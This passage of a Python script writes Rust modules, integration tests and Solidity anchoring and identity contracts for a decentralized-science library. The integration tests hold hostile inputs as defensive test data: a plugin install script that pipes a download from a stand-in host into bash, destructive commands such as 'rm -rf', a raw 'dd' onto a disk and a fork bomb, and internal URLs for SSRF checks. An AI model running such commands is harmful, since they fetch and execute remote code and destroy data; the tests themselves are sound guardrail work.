        let h1 = compute_anchor_hash(&msg);
        msg.license = "MIT".into();
        let h2 = compute_anchor_hash(&msg);
        assert_ne!(h1, h2);
    }

    #[test]
    fn test_register_identity_msg() {
        let msg = RegisterIdentityMsg {
            did: "did:arkhe:orcid:abc12345".into(),
            orcid_id: Some("0000-0001-2345-6789".into()),
            controller: "did:arkhe:orcid:abc12345".into(),
        };
        let json = serde_json::to_string(&msg).unwrap();
        let msg2: RegisterIdentityMsg = serde_json::from_str(&json).unwrap();
        assert_eq!(msg.did, msg2.did);
    }

    #[test]
    fn test_anchor_info_serialization() {
        let info = AnchorInfo {
            cid: "QmTest".into(),
            owner: "sei1abc...".into(),
            author_did: "did:arkhe:x".into(),
            orcid_id: Some("0000-0001-2345-6789".into()),
            trace_id: Some("trace-1".into()),
            checksum_sha256: "sha256:x".into(),
            anchored_at: 1719792000,
            block_height: 12345678,
            tx_hash: "0xABC".into(),
        };
        let json = serde_json::to_string_pretty(&info).unwrap();
        let info2: AnchorInfo = serde_json::from_str(&json).unwrap();
        assert_eq!(info.block_height, info2.block_height);
        assert_eq!(info.trace_id, info2.trace_id);
    }

    #[test]
    fn test_anchor_event_serialization() {
        let ev = AnchorEvent {
            event_type: "wasm-anchor".into(),
            cid: "QmX".into(),
            author_did: "did:a".into(),
            block_height: 100,
            tx_hash: "0x123".into(),
        };
        let json = serde_json::to_string(&ev).unwrap();
        let ev2: AnchorEvent = serde_json::from_str(&json).unwrap();
        assert_eq!(ev.tx_hash, ev2.tx_hash);
    }
}
'''

with open(f"{base_dir}/src/sei_giga.rs", "w") as f:
    f.write(sei_rs)

lib_rs = r'''//! ARKHE × DeSciOS — Integração para Ciência Descentralizada v0.2.0
//!
//! Módulos:
//! - `error` — Tipos de erro unificados
//! - `plugin_governance` — Validação de plugins contra invariantes
//! - `assistant_guardrails` — PII masking + content filtering + SSRF prevention
//! - `workflow_traceability` — Causal chains IC16 com blake3
//! - `publishing` — IPFS + WormGraph gRPC
//! - `nodes_desci` — Integração com nodes.desci
//! - `orcid` — ORCID ↔ DIDArkhe bridge
//! - `sei_giga` — SEI GigaChain on-chain anchoring
//!
//! # Features
//! - `ipfs` (default) — Habilita clientes HTTP para IPFS, ORCID, nodes.desci, SEI
//! - `orcid` (default) — Habilita cliente ORCID
//! - `sei-giga` — Habilita cliente SEI GigaChain

pub mod error;
pub mod plugin_governance;
pub mod assistant_guardrails;
pub mod workflow_traceability;
pub mod publishing;
pub mod nodes_desci;
pub mod orcid;
pub mod sei_giga;

// Re-exports principais
pub use error::{DesciError, Result};
pub use plugin_governance::{PluginValidator, PluginManifest, ValidationResult, ValidationCheck};
pub use assistant_guardrails::{
    DeSciAssistantGuardrails, AssistantContext, GuardrailConfig,
    GuardrailCheckResult, GuardrailCategory, PiiMasker, PiiCheckResult,
    Redaction, PiiType,
};
pub use workflow_traceability::{
    ScientificWorkflowTrace, WorkflowStep, WorkflowType, StepId, StepStatus,
};
pub use publishing::{
    DatasetMetadata, IpfsPublishResult, PublishResult,
    IpfsClient, WormGraphNotifier, DeSciPublisher,
};
pub use nodes_desci::{
    NodeInfo, NodeStatus, NodeDataset, NodeSearchResult,
    NodesDesciClient, NodeRegistry,
};
pub use orcid::{
    OrcidProfile, OrcidDID, DidDocument, OrcidAttestation,
    OrcidClient, derive_did, build_did_document,
    create_attestation, verify_attestation, DID_ORCID_PREFIX,
};
pub use sei_giga::{
    AnchorMsg, RegisterIdentityMsg, AnchorInfo, IdentityInfo,
    AnchorEvent, SeiGigaClient, compute_anchor_hash,
};

pub const VERSION: &str = env!("CARGO_PKG_VERSION");
'''

with open(f"{base_dir}/src/lib.rs", "w") as f:
    f.write(lib_rs)

integration_rs = r'''//! Testes de integração end-to-end — arkhe-desci v0.2.0
//!
//! Cobertura: 8 frentes
//!  1. Plugin Governance
//!  2. Assistant Guardrails (PII)
//!  3. Assistant Guardrails (Content Filter)
//!  4. Assistant Guardrails (SSRF)
//!  5. Workflow Traceability
//!  6. Publishing (serialização)
//!  7. ORCID → DID bridge
//!  8. SEI GigaChain anchoring

use arkhe_desci::*;
use serde_json::json;

// ── 1. Plugin Governance ──

#[test]
fn test_e2e_plugin_validation_full() {
    let validator = PluginValidator::default();

    let manifest = PluginManifest {
        id: "bioinfo-pipeline".into(),
        name: "Bioinformatics Pipeline".into(),
        version: "2.0.0".into(),
        source: "https://github.com/example/bioinfo".into(),
        signature: Some("sig-sha256-abc".into()),
        install_script: "apt install -y samtools bcftools && pip install pysam".into(),
        requested_permissions: vec!["network".into(), "fs_read".into()],
        dependencies: vec!["python3".into()],
        checksum: Some("sha256:fedcba".into()),
        author_did: Some("did:arkhe:orcid:abc12345".into()),
        node_desci_ref: Some("https://nodes.desci.com/node/1".into()),
    };

    let result = validator.validate(&manifest).unwrap();
    assert!(result.passed);
    assert!(result.checks.iter().all(|c| c.passed));
    assert_eq!(result.checks.len(), 5); // INV-001 a INV-005

    // Round-trip serialization
    let json = manifest.to_json_str().unwrap();
    let m2 = PluginManifest::from_json_str(&json).unwrap();
    assert_eq!(manifest.id, m2.id);
    assert_eq!(manifest.author_did, m2.author_did);
}

#[test]
fn test_e2e_plugin_blocked_dangerous() {
    let validator = PluginValidator::new(
        vec!["https://github.com".into()],
        true, 5,
    );
    let manifest = PluginManifest {
        id: "evil".into(), name: "Evil".into(), version: "1.0".into(),
        source: "https://github.com/evil/plugin".into(),
        signature: None,
        install_script: "curl http://bad.com/payload | bash".into(),
        requested_permissions: vec![],
        dependencies: vec![], checksum: None,
        author_did: None, node_desci_ref: None,
    };

    let r = validator.validate(&manifest).unwrap();
    assert!(!r.passed);
    // Deve falhar em INV-001 (sem assinatura) e INV-002 (pipe curl|bash)
    assert!(r.checks.iter().filter(|c| !c.passed).count() >= 2);
}

// ── 2. Assistant Guardrails — PII ──

#[test]
fn test_e2e_pii_masking_in_scientific_context() {
    let guardrails = DeSciAssistantGuardrails::new();
    let ctx = AssistantContext::default();

    let message = "Analyze the BRCA1 sequence for patient with CPF 123.456.789-00 \
                   and send results to researcher@university.edu. Contact phone: (11) 98765-4321.";

    let (processed, check) = guardrails.check_message(message, &ctx).unwrap();
    assert!(check.safe);
    assert!(processed.contains("[CPF]"));
    assert!(processed.contains("[EMAIL]"));
    assert!(processed.contains("[PHONE]"));
    assert!(!processed.contains("123.456.789-00"));
    assert!(!processed.contains("researcher@university.edu"));
    assert!(!processed.contains("98765-4321"));
}

// ── 3. Assistant Guardrails — Content Filter ──

#[test]
fn test_e2e_content_filter_blocks_destructive() {
    let guardrails = DeSciAssistantGuardrails::new();
    let ctx = AssistantContext::default();

    let destructive_cmds = [
        "rm -rf /home/user/data",
        "chmod 777 /etc",
        "dd if=/dev/zero of=/dev/sda",
        ":(){ :|:& };:",
    ];

    for cmd in destructive_cmds {
        let (proc, check) = guardrails.check_message(cmd, &ctx).unwrap();
        assert!(!check.safe, "Should block: {}", cmd);
        assert_eq!(proc, "[CONTENT_BLOCKED]");
    }
}

#[test]
fn test_e2e_scientific_queries_pass() {
    let guardrails = DeSciAssistantGuardrails::new();
    let ctx = AssistantContext::default();

    let queries = [
        "Run BLAST alignment on the BRCA1 gene sequence",
        "Perform variant calling with GATK on the WGS data",
        "Create a phylogenetic tree from the MSA results",
        "Run differential expression analysis with DESeq2",
        "Visualize the protein structure with PyMOL",
    ];

    for q in &queries {
        let (proc, check) = guardrails.check_message(q, &ctx).unwrap();
        assert!(check.safe, "Should pass: {}", q);
        assert_eq!(proc, *q);
    }
}

// ── 4. Assistant Guardrails — SSRF ──

#[test]
fn test_e2e_ssrf_blocks_internal() {
    let guardrails = DeSciAssistantGuardrails::new();

    let blocked = [
        "http://localhost:5001/api/v0/add",
        "http://127.0.0.1:11434/api/generate",
        "http://0.0.0.0:8080/admin",
        "http://[::1]:9090/metrics",
        "http://10.0.0.1/secrets",
        "http://172.16.0.1/internal",
        "http://192.168.1.1/config",
    ];

    for url in &blocked {
        let r = guardrails.check_url(url).unwrap();
        assert!(!r.safe, "Should block SSRF: {}", url);
    }

    let allowed = [
        "https://ncbi.nlm.nih.gov/blast",
        "https://ensembl.org/Homo_sapiens",
        "https://www.uniprot.org/uniprot/P38398",
    ];

    for url in &allowed {
        let r = guardrails.check_url(url).unwrap();
        assert!(r.safe, "Should allow: {}", url);
    }
}

// ── 5. Workflow Traceability ──

#[test]
fn test_e2e_workflow_full_lifecycle() {
    let mut trace = ScientificWorkflowTrace::new(
        "BRCA1_variant_calling",
        WorkflowType::Nextflow,
    )
    .with_owner("did:arkhe:orcid:abc12345")
    .with_metadata("sample", "BRCA1_001");

    // Step 1: Download
    let mut s1 = WorkflowStep::new("dl", "Download Reference", "wget")
        .with_parameters(json!({"url": "https://example.com/hg38.fa.gz"}))
        .with_agent("did:arkhe:agent-downloader");
    s1.start(); s1.complete(vec!["hg38.fa.gz".into()]);
    trace.add_step(s1).unwrap();

    // Step 2: Index
    let mut s2 = WorkflowStep::new("idx", "Index Reference", "bwa")
        .with_parameters(json!({"algo": "bwtsw"}))
        .with_inputs(vec!["hg38.fa.gz".into()])
        .with_agent("did:arkhe:agent-bioinfo");
    s2.start(); s2.complete(vec!["hg38.fa.bwt".into()]);
    trace.add_step(s2).unwrap();

    // Step 3: Align
    let mut s3 = WorkflowStep::new("aln", "Align Reads", "bwa-mem")
        .with_inputs(vec!["hg38.fa.gz".into(), "reads.fq".into()])
        .with_agent("did:arkhe:agent-bioinfo");
    s3.start(); s3.complete(vec!["aligned.sam".into()]);
    trace.add_step(s3).unwrap();

    // Step 4: Variant call
    let mut s4 = WorkflowStep::new("vc", "Call Variants", "bcftools")
        .with_inputs(vec!["aligned.sam".into()])
        .with_agent("did:arkhe:agent-caller");
    s4.start(); s4.complete(vec!["variants.vcf.gz".into()]);
    trace.add_step(s4).unwrap();

    // Verify
    assert_eq!(trace.total_count(), 4);
    assert_eq!(trace.completed_count(), 4);
    assert!(trace.verify());
    assert_eq!(trace.owner_did.as_deref(), Some("did:arkhe:orcid:abc12345"));

    // Tamper detection
    trace.steps[2].name = "TAMPERED".into();
    assert!(!trace.verify());

    // Round-trip serialization
    let json = serde_json::to_string(&trace).unwrap();
    let trace2: ScientificWorkflowTrace = serde_json::from_str(&json).unwrap();
    assert_eq!(trace.trace_id, trace2.trace_id);
    assert_eq!(trace.causal_chain, trace2.causal_chain);
}

// ── 6. Publishing ──

#[test]
fn test_e2e_publishing_metadata_with_all_fields() {
    let meta = DatasetMetadata {
        name: "BRCA1_001 Variants v3".into(),
        description: "Somatic variants from WGS".into(),
        format: "vcf.gz".into(),
        version: "3.0.0".into(),
        author_did: "did:arkhe:orcid:abc12345".into(),
        orcid_id: Some("0000-0001-2345-6789".into()),
        license: "CC-BY-4.0".into(),
        tags: vec!["genomics".into(), "brca1".into(), "somatic".into()],
        created_at: "2026-07-01T12:00:00Z".into(),
        checksum_sha256: "sha256:abcdef123456".into(),
        trace_id: Some("trace-abc-123".into()),
        node_desci_url: Some("https://nodes.desci.com/node/1".into()),
    };

    let json = serde_json::to_string_pretty(&meta).unwrap();
    assert!(json.contains("orcid_id"));
    assert!(json.contains("trace_id"));
    assert!(json.contains("node_desci_url"));

    let meta2: DatasetMetadata = serde_json::from_str(&json).unwrap();
    assert_eq!(meta.trace_id, meta2.trace_id);
    assert_eq!(meta.node_desci_url, meta2.node_desci_url);
}

// ── 7. ORCID → DID Bridge ──

#[test]
fn test_e2e_orcid_did_full_flow() {
    let orcid = "0000-0001-2345-6789";

    // Derive DID
    let did = derive_did(orcid);
    assert!(did.starts_with("did:arkhe:orcid:"));

    // Build DID Document
    let odid = build_did_document(orcid);
    assert_eq!(odid.did, did);
    assert_eq!(odid.orcid_id, orcid);
    assert!(!odid.verified);

    // Create attestation
    let att = create_attestation(
        "did:arkhe:authority-01",
        &did,
        orcid,
        48,
    );
    assert!(verify_attestation(&att));

    // Verify tamper detection
    let mut tampered = att.clone();
    tampered.orcid_id = "0000-0002-0000-0000".into();
    assert!(!verify_attestation(&tampered));

    // DID Document round-trip
    let doc_json = serde_json::to_string(&odid.did_document).unwrap();
    let doc2: DidDocument = serde_json::from_str(&doc_json).unwrap();
    assert_eq!(odid.did_document.id, doc2.id);
    assert_eq!(odid.did_document.service.len(), doc2.service.len());
}

// ── 8. SEI GigaChain Anchoring ──

#[test]
fn test_e2e_sei_anchoring_flow() {
    let orcid = "0000-0001-2345-6789";
    let did = derive_did(orcid);

    let anchor_msg = AnchorMsg {
        cid: "QmBRCA1Dataset".into(),
        checksum_sha256: "sha256:abc123".into(),
        author_did: did.clone(),
        orcid_id: Some(orcid.into()),
        trace_id: Some("trace-xyz".into()),
        metadata_uri: Some("ipfs://QmMeta".into()),
        license: "CC-BY-4.0".into(),
    };

    // Compute anchor hash (off-chain verification)
    let hash = compute_anchor_hash(&anchor_msg);
    assert!(!hash.is_empty());

    // Deterministic
    assert_eq!(hash, compute_anchor_hash(&anchor_msg));

    // Different CID → different hash
    let mut msg2 = anchor_msg.clone();
    msg2.cid = "QmOther".into();
    assert_ne!(hash, compute_anchor_hash(&msg2));

    // Serialization round-trip
    let json = serde_json::to_string(&anchor_msg).unwrap();
    let msg3: AnchorMsg = serde_json::from_str(&json).unwrap();
    assert_eq!(anchor_msg.cid, msg3.cid);
    assert_eq!(anchor_msg.trace_id, msg3.trace_id);
}

// ── Cross-module: ORCID → DID → Plugin → Trace → Anchor ──

#[test]
fn test_e2e_cross_module_full_pipeline() {
    let orcid = "0000-0001-2345-6789";
    let did = derive_did(orcid);

    // 1. Plugin do pesquisador (com DID)
    let manifest = PluginManifest {
        id: "my-pipeline".into(),
        name: "My Pipeline".into(),
        version: "1.0.0".into(),
        source: "https://github.com/example/pipeline".into(),
        signature: Some("sig".into()),
        install_script: "apt install -y samtools".into(),
        requested_permissions: vec!["network".into()],
        dependencies: vec![],
        checksum: Some("sha256:x".into()),
        author_did: Some(did.clone()),
        node_desci_ref: None,
    };
    let validator = PluginValidator::default();
    assert!(validator.validate(&manifest).unwrap().passed);

    // 2. Workflow com owner DID
    let mut trace = ScientificWorkflowTrace::new("cross-test", WorkflowType::Nextflow)
        .with_owner(&did);
    let mut s = WorkflowStep::new("s1", "Step", "tool").with_agent(&did);
    s.start(); s.complete(vec!["out".into()]);
    trace.add_step(s).unwrap();
    assert!(trace.verify());

    // 3. Dataset metadata com ORCID + trace + DID
    let meta = DatasetMetadata {
        name: "Cross-module test".into(),
        description: "Test".into(),
        format: "json".into(),
        version: "1.0.0".into(),
        author_did: did.clone(),
        orcid_id: Some(orcid.into()),
        license: "MIT".into(),
        tags: vec![],
        created_at: "2026-07-01T12:00:00Z".into(),
        checksum_sha256: "sha256:x".into(),
        trace_id: Some(trace.trace_id.clone()),
        node_desci_url: None,
    };

    // 4. Anchor on SEI
    let anchor_msg = AnchorMsg {
        cid: "QmCrossModule".into(),
        checksum_sha256: meta.checksum_sha256.clone(),
        author_did: did.clone(),
        orcid_id: meta.orcid_id.clone(),
        trace_id: meta.trace_id.clone(),
        metadata_uri: None,
        license: meta.license.clone(),
    };
    let anchor_hash = compute_anchor_hash(&anchor_msg);
    assert!(!anchor_hash.is_empty());

    // 5. ORCID attestation
    let att = create_attestation("did:arkhe:authority", &did, orcid, 24);
    assert!(verify_attestation(&att));

    // Tudo conectado: ORCID → DID → Plugin.author_did → Trace.owner_did →
    //   Metadata.author_did + orcid_id + trace_id → Anchor.author_did + orcid_id + trace_id
    assert_eq!(manifest.author_did.as_deref(), Some(&did));
    assert_eq!(trace.owner_did.as_deref(), Some(&did));
    assert_eq!(&meta.author_did, &did);
    assert_eq!(&anchor_msg.author_did, &did);
    assert_eq!(anchor_msg.trace_id, meta.trace_id);
    assert_eq!(anchor_msg.orcid_id, meta.orcid_id);
}
'''

with open(f"{base_dir}/tests/integration.rs", "w") as f:
    f.write(integration_rs)

desci_anchor_sol = '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title DesciAnchor
 * @notice Ancora datasets DeSci on-chain com vínculo a DID e ORCID
 * @dev Deployed em SEI GigaChain (ou EVM sidechain)
 *
 * Fluxo: researcher (DID) → anchorDataset(CID, checksum, ORCID, trace) → evento emitido
 * Query: getAnchor(CID) → AnchorInfo
 */

struct Anchor {
    string cid;
    string checksumSha256;
    string authorDid;
    string orcidId;        // opcional
    string traceId;        // IC16 causal chain ID
    string metadataUri;    // IPFS URI para metadados completos
    string license;
    address owner;
    uint256 anchoredAt;
    uint256 blockHeight;
}

event DatasetAnchored(
    string indexed cid,
    string authorDid,
    string orcidId,
    uint256 blockHeight
);

event DatasetAnchoredWithTrace(
    string indexed cid,
    string traceId,
    string authorDid,
    uint256 blockHeight
);

contract DesciAnchor {
    // CID => Anchor
    mapping(string => Anchor) public anchors;
    // DID => count de anchors
    mapping(string => uint256) public anchorCounts;
    // ORCID => DID (para verificação)
    mapping(string => string) public orcidToDid;

    uint256 public totalAnchors;
    address public admin;

    modifier onlyAdmin() {
        require(msg.sender == admin, "Not admin");
        _;
    }

    constructor() {
        admin = msg.sender;
    }

    /**
     * @notice Ancora um dataset na blockchain
     * @param _cid IPFS CID do dataset
     * @param _checksum SHA-256 do arquivo original
     * @param _authorDid DID ARKHE do autor
     * @param _orcidId ORCID iD do autor (vazio se não aplicável)
     * @param _traceId IC16 trace ID (vazio se não aplicável)
     * @param _metadataUri IPFS URI para metadados JSON
     * @param _license Licença do dataset
     */
    function anchorDataset(
        string calldata _cid,
        string calldata _checksum,
        string calldata _authorDid,
        string calldata _orcidId,
        string calldata _traceId,
        string calldata _metadataUri,
        string calldata _license
    ) external {
        require(bytes(anchors[_cid].cid).length == 0, "Already anchored");
        require(bytes(_cid).length > 0, "CID empty");
        require(bytes(_authorDid).length > 0, "DID empty");

        anchors[_cid] = Anchor({
            cid: _cid,
            checksumSha256: _checksum,
            authorDid: _authorDid,
            orcidId: _orcidId,
            traceId: _traceId,
            metadataUri: _metadataUri,
            license: _license,
            owner: msg.sender,
            anchoredAt: block.timestamp,
            blockHeight: block.number
        });

        anchorCounts[_authorDid]++;
        totalAnchors++;

        if (bytes(_orcidId).length > 0) {
            orcidToDid[_orcidId] = _authorDid;
        }

        emit DatasetAnchored(_cid, _authorDid, _orcidId, block.number);

        if (bytes(_traceId).length > 0) {
            emit DatasetAnchoredWithTrace(_cid, _traceId, _authorDid, block.number);
        }
    }

    /**
     * @notice Retorna informações de um anchor
     */
    function getAnchor(string calldata _cid) external view returns (Anchor memory) {
        require(bytes(anchors[_cid].cid).length > 0, "Not found");
        return anchors[_cid];
    }

    /**
     * @notice Verifica se um CID está ancorado
     */
    function isAnchored(string calldata _cid) external view returns (bool) {
        return bytes(anchors[_cid].cid).length > 0;
    }

    /**
     * @notice Resolve ORCID para DID
     */
    function resolveOrcid(string calldata _orcidId) external view returns (string memory) {
        return orcidToDid[_orcidId];
    }

    /**
     * @notice Retorna número de anchors de um DID
     */
    function getAnchorCount(string calldata _did) external view returns (uint256) {
        return anchorCounts[_did];
    }
}
'''

with open(f"{base_dir}/contracts/DesciAnchor.sol", "w") as f:
    f.write(desci_anchor_sol)

desci_identity_sol = '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title DesciIdentity
 * @notice Registry de identidades DID para pesquisadores DeSci
 * @dev Mapeia DID → ORCID → metadados, com suporte a attestations
 */

struct Identity {
    string did;
    string orcidId;
    string controller;
    string name;
    string institution;
    uint256 registeredAt;
    bool active;
}

struct Attestation {
    string attesterDid;
    string claimType;
    string claimData;      // JSON-encoded
    uint256 issuedAt;
    uint256 expiresAt;
    bytes32 proofHash;
    bool revoked;
}

event IdentityRegistered(string indexed did, string orcidId);
event AttestationAdded(string indexed subjectDid, string claimType, string attesterDid);
event AttestationRevoked(string indexed subjectDid, string attesterDid);

contract DesciIdentity {
    mapping(string => Identity) public identities;
    // did => attesterDid => attestation index => Attestation
    mapping(string => mapping(string => Attestation[])) public attestations;

    uint256 public totalIdentities;
    address public admin;
    address public authority; // DID authority que pode emitir attestations

    modifier onlyAdmin() {
        require(msg.sender == admin, "Not admin");
        _;
    }

    modifier onlyAuthority() {
        require(msg.sender == authority, "Not authority");
        _;
    }

    constructor() {
        admin = msg.sender;
        authority = msg.sender;
    }

    function setAuthority(address _authority) external onlyAdmin {
        authority = _authority;
    }

    /**
     * @notice Registra uma identidade DID com ORCID opcional
     */
    function registerIdentity(
        string calldata _did,
        string calldata _orcidId,
        string calldata _controller,
        string calldata _name,
        string calldata _institution
    ) external {
        require(bytes(identities[_did].did).length == 0, "Already registered");
        require(bytes(_did).length > 0, "DID empty");

        identities[_did] = Identity({
            did: _did,
            orcidId: _orcidId,
            controller: _controller,
            name: _name,
            institution: _institution,
            registeredAt: block.timestamp,
            active: true
        });

        totalIdentities++;
        emit IdentityRegistered(_did, _orcidId);
    }

    /**
     * @notice Adiciona attestation a uma identidade
     */
    function addAttestation(
        string calldata _subjectDid,
        string calldata _attesterDid,
        string calldata _claimType,
        string calldata _claimData,
        uint256 _validitySeconds,
        bytes32 _proofHash
    ) external onlyAuthority {
        require(bytes(identities[_subjectDid].did).length > 0, "Identity not found");

        attestations[_subjectDid][_attesterDid].push(Attestation({
            attesterDid: _attesterDid,
            claimType: _claimType,
            claimData: _claimData,
            issuedAt: block.timestamp,
            expiresAt: block.timestamp + _validitySeconds,
            proofHash: _proofHash,
            revoked: false
        }));

        emit AttestationAdded(_subjectDid, _claimType, _attesterDid);
    }

    /**
     * @notice Revoca attestation
     */
    function revokeAttestation(
        string calldata _subjectDid,
        string calldata _attesterDid,
        uint256 _index
    ) external onlyAuthority {
        require(_index < attestations[_subjectDid][_attesterDid].length, "Invalid index");
        attestations[_subjectDid][_attesterDid][_index].revoked = true;
        emit AttestationRevoked(_subjectDid, _attesterDid);
    }

    /**
     * @notice Retorna uma identidade
     */
    function getIdentity(string calldata _did) external view returns (Identity memory) {
        require(bytes(identities[_did].did).length > 0, "Not found");
        return identities[_did];
    }

    /**
     * @notice Retorna número de attestations válidas
     */
    function getValidAttestationCount(
        string calldata _did,
        string calldata _attesterDid
    ) external view returns (uint256) {
        uint256 count = 0;
        Attestation[] storage atts = attestations[_did][_attesterDid];
        for (uint256 i = 0; i < atts.length; i++) {
            if (!atts[i].revoked && atts[i].expiresAt > block.timestamp) {
                count++;
            }
        }
        return count;
    }
}
'''

with open(f"{base_dir}/contracts/DesciIdentity.sol", "w") as f:
    f.write(desci_identity_sol)
